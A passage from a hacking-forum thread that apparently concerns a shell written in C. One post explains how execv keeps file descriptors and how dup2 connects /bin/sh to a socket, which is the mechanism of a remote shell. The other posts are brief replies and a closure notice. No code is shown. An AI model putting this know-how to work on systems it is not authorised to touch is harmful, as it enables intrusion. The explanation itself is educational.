<meta itemprop="dateModified" content="2017-03-04T16:42:51Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Wanted to have a little refresher on shells in C and I’d like to make some notes in case someone didn’t fully understand <strong><em>why</em></strong> the shell works.</p>
<p>When execv was called:</p>
<ul>
<li>
<p>The caller’s memory image was overwritten by the new one.</p>
</li>
<li>
<p>The file table stayed in place. Meaning, open file descriptors are preserved across a call to execv. Thus, once bin/sh was called, its stdin/stdout/stderr were “pointing” to the socket descriptors thanks to dup2(), leading you to be able to see the communication between the client and the server.</p>
</li>
<li>
<p>When the shell or any application runs a program, it forks, dup2’s the open <a href="http://stackoverflow.com/questions/8514735/what-is-special-about-dev-tty" rel="noopener nofollow ugc">tty</a> file descriptors to 0,1,2, and then control is passed over to execv.</p>
</li>
</ul>
<p>From the exec*'s man page:</p>
<pre><code class="lang-makefile">By default, file descriptors remain open across an execve().
Except those having FD_CLOEXEC flag set.

</code></pre>
<p>Here’s a short and nice explanation as to what’s going on from a high-level perspective:</p>
<aside class="onebox stackexchange">
<header class="source">
<a href="https://stackoverflow.com/questions/3179636/execve-and-sharing-file-descriptors" target="_blank" rel="noopener nofollow ugc">stackoverflow.com</a>
</header>
<article class="onebox-body">
<a href="https://stackoverflow.com/users/344716/ashish" target="_blank" rel="noopener nofollow ugc">
<img alt="Ashish" src="https://0x00sec.s3.amazonaws.com/original/2X/b/b1b202b38d9ecd86420b3fd2e9ba336c0dd0c9d6.png" class="thumbnail onebox-avatar" width height>
</a>
<h4>
<a href="https://stackoverflow.com/questions/3179636/execve-and-sharing-file-descriptors" target="_blank" rel="noopener nofollow ugc">execve() and sharing file descriptors</a>
</h4>
<div class="tags">
<strong>c, operating-system</strong>
</div>
<div class="date">
asked by
<a href="https://stackoverflow.com/users/344716/ashish" target="_blank" rel="noopener nofollow ugc">
Ashish
</a>
on <a href="https://stackoverflow.com/questions/3179636/execve-and-sharing-file-descriptors" target="_blank" rel="noopener nofollow ugc">01:01PM - 05 Jul 10 UTC</a>
</div>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p>P.S exec*() won’t return control back to main().</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Valkyr"><span itemprop="name">Valkyr</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-04T21:58:56Z" class="post-time">
March 4, 2017, 9:58pm
</time>
<meta itemprop="dateModified" content="2017-03-04T21:58:56Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>wish i could write so great scripts in c. I got stuck with the pointers in college, and never progressed. Pointer itself wasnt rly the thing, more when to use “*” , “&amp;” , or just the variable without any of these.</p>
<p>Respect to you sir !</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/kowalski"><span itemprop="name">kowalski</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-05T06:33:36Z" class="post-time">
March 5, 2017, 6:33am
</time>
<meta itemprop="dateModified" content="2017-03-05T06:33:36Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<ol>
<li>You don’t write scripts in C. <img src="../../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">
</li>
<li>You can always start with it again!</li>
</ol>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="../269.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-21T00:37:55Z" class="post-time">
January 21, 2018, 12:37am
</time>
<meta itemprop="dateModified" content="2018-01-21T00:37:55Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
